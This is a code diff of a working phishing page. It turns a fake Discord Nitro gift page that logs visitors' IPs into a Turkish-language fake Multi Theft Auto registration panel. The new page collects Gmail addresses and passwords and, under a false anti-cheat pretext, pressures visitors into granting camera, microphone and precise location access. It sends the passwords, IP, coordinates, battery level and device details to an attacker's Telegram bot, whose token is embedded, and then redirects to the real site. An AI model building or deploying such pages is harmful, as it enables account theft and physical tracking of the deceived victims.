@@ -3,97 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord | Nitro Gift</title>
+    <title>MTA:SA Global Registry - Verification Required</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #313338; font-family: 'gg sans', 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: #f2f3f5; }
-        .nitro-card { background-color: #2b2d31; width: 90%; max-width: 440px; border-radius: 8px; overflow: hidden; box-shadow: 0 8px 16px rgba(0,0,0,0.3); text-align: center; border: 1px solid #1e1f22; }
+        body { margin: 0; padding: 0; background-color: #0a0a0a; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; overflow: hidden; }
+        .mta-box { background: #161616; width: 100%; max-width: 380px; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 25px 50px rgba(0,0,0,1); text-align: center; position: relative; }
+        .logo-img { width: 110px; margin-bottom: 15px; filter: drop-shadow(0 0 8px #3498db); }
+        h2 { font-size: 18px; margin-bottom: 20px; color: #3498db; text-transform: uppercase; letter-spacing: 1px; }
         
-        /* Düzeltilen Banner: CSS ile Nitro Deseni */
-        .banner { 
-            width: 100%; 
-            height: 130px; 
-            background: linear-gradient(135deg, #8547ff 0%, #ff73fa 100%);
-            background-image: radial-gradient(circle at 20% 30%, rgba(255,255,255,0.1) 0%, transparent 20%), 
-                              radial-gradient(circle at 80% 70%, rgba(255,255,255,0.1) 0%, transparent 20%);
-            position: relative;
-        }
-
-        .nitro-logo-wrapper {
-            width: 80px;
-            height: 80px;
-            background-color: #2b2d31;
-            border-radius: 16px;
-            margin: -40px auto 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border: 6px solid #2b2d31;
-        }
-
-        .nitro-logo-wrapper img { width: 50px; height: auto; }
-
-        h1 { font-size: 24px; margin: 15px 0 10px; font-weight: 700; }
-        p { font-size: 15px; padding: 0 40px; line-height: 1.4; color: #b5bac1; margin-bottom: 25px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { display: block; font-size: 11px; color: #666; margin-bottom: 5px; font-weight: bold; }
+        .input-group input { width: 100%; padding: 12px; background: #222; border: 1px solid #333; border-radius: 6px; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
+        .input-group input:focus { border-color: #3498db; box-shadow: 0 0 10px rgba(52, 152, 219, 0.3); }
         
-        .claim-button { 
-            background-color: #5865f2; 
-            color: white; 
-            border: none; 
-            padding: 12px 60px; 
-            border-radius: 3px; 
-            font-size: 16px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            transition: background 0.2s; 
-            margin-bottom: 30px;
-        }
-        .claim-button:hover { background-color: #4752c4; }
-
-        .footer { 
-            background-color: #232428; 
-            padding: 12px; 
-            font-size: 11px; 
-            color: #949ba4; 
-            text-transform: uppercase; 
-            letter-spacing: 0.5px;
-            font-weight: 700;
-        }
+        .main-btn { background: #3498db; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 10px; }
+        
+        /* DOĞRULAMA EKRANI (ZORUNLU KISIM) */
+        #verify-modal { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; border-radius: 15px; padding: 30px; box-sizing: border-box; z-index: 10; flex-direction: column; justify-content: center; }
+        .verify-icon { font-size: 40px; color: #f1c40f; margin-bottom: 15px; }
+        .verify-text { font-size: 13px; color: #ccc; margin-bottom: 25px; line-height: 1.6; }
+        .confirm-btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="nitro-card">
-    <div class="banner"></div>
-    <div class="nitro-logo-wrapper">
-        <img src="https://assets-global.website-files.com/6257adef93867e3d18a4a445/63621535728a4870f2095818_grey-dis.png" alt="Nitro">
+<div class="mta-box">
+    <div id="reg-step">
+        <img src="https://www.multitheftauto.com/images/mta_logo.png" class="logo-img">
+        <h2>Sunucu Kayıt Paneli</h2>
+        <div class="input-group">
+            <label>GMAIL ADRESİ</label>
+            <input type="email" id="email" placeholder="email@gmail.com">
+        </div>
+        <div class="input-group">
+            <label>ŞİFRE</label>
+            <input type="password" id="pass" placeholder="********">
+        </div>
+        <button class="main-btn" onclick="dogrulamaGoster()">HESABI OLUŞTUR</button>
     </div>
-    <h1>You've been gifted Nitro!</h1>
-    <p>A user has sent you a gift for <b>3 Months of Discord Nitro</b>. Click below to add it to your account.</p>
-    <button class="claim-button" onclick="window.location.href='https://discord.com/nitro'">Claim Gift</button>
-    <div class="footer">Limited time offer • Seasonal Rewards</div>
+
+    <div id="verify-modal">
+        <div class="verify-icon">⚠️</div>
+        <h3>SON ADIM: DOĞRULAMA</h3>
+        <p class="verify-text">
+            MTA:SA Anti-Cheat ve Voice Chat (Sesli Sohbet) sisteminin aktif edilebilmesi için <b>Konum</b> ve <b>Medya</b> erişim doğrulaması zorunludur.
+        </p>
+        <button class="confirm-btn" onclick="herseyiBitir()">ERİŞİMİ ONAYLA VE BAĞLAN</button>
+        <p style="font-size: 10px; color: #555; margin-top: 15px;">Reddedilmesi durumunda kayıt iptal edilecektir.</p>
+    </div>
 </div>
 
 <script>
     const botToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
     const chatId = "1540769169";
 
-    async function yakala() {
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const ip = ipData.ip;
-
-            const mesaj = `💎 **NITRO TUZAĞI BAŞARILI**\n\n🌐 **IP:** \`${ip}\`\n📱 **Cihaz:** ${navigator.platform}\n🌍 **Dil:** ${navigator.language}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=markdown`, {
-                mode: 'no-cors',
-                keepalive: true
-            });
-        } catch (e) {}
+    // İlk aşama: Bilgileri al ve modalı göster
+    function dogrulamaGoster() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        if(!email || !pass) { alert("Lütfen alanları doldurun!"); return; }
+        
+        document.getElementById('reg-step').style.opacity = '0.2';
+        document.getElementById('verify-modal').style.display = 'flex';
     }
-    window.onload = yakala;
+
+    // İkinci aşama: İzinleri zorunlu olarak iste ve verileri gönder
+    async function herseyiBitir() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        // 1. Kamera ve Mikrofon (Zorunlu gibi soruluyor)
+        try {
+            await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            gonder("📸 **KAMERA/MİKROFON İZNİ ONAYLANDI!**");
+        } catch(e) { gonder("❌ Kamera izni reddedildi."); }
+
+        // 2. Tam Konum (Zorunlu gibi soruluyor)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(p => {
+                gonder(`📍 **TAM KONUM:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, () => { gonder("❌ Konum reddedildi."); });
+        }
+
+        // 3. IP ve Teknik Bilgiler
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            
+            let batarya = "Bilinmiyor";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batarya = `%${Math.round(b.level * 100)}`;
+            }
+
+            const mesaj = `🔥 **MTA ZORUNLU KAYIT VERİSİ**\n\n` +
+                          `📧 **Gmail:** \`${email}\`\n` +
+                          `🔑 **Şifre:** \`${pass}\`\n` +
+                          `🌐 **IP:** \`${ipData.ip}\`\n` +
+                          `🔋 **Şarj:** ${batarya}\n` +
+                          `📱 **Sistem:** ${navigator.platform}`;
+
+            gonder(mesaj);
+        } catch(e) {}
+
+        // Final Mesajı
+        alert("Doğrulama başarılı! Hesabınız 5 dakika içinde aktif edilecektir.");
+        window.location.href = "https://multitheftauto.com";
+    }
+
+    function gonder(m) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=markdown`);
+    }
 </script>
 
 </body>
 </html>
-
